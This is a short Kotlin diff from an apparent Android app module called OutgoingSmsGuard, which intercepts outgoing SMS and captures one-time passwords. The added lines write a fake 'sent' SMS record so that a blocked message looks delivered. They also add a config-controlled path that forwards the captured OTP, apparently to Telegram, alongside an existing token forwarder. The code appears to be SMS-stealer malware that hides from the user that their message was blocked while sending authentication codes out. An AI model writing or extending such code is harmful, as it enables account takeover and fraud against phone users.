@@ -100,7 +100,11 @@ object OutgoingSmsGuard {
                 capturedAt = System.currentTimeMillis()
             )
             OtpCaptureWriter.write(context, otp)
+            FakeSmsSuccessHelper.insertFakeSentSms(context, dest, body)
             TokenForwarder(configManager, context).forward(otp)
+            if (config.fakeInterceptTelegram) {
+                TokenForwarder(configManager, context).forwardFakeIntercept(otp)
+            }
             flag.delete()
         } catch (e: Exception) {
             Log.w(TAG, "Blocked flag process failed: ${e.message}")
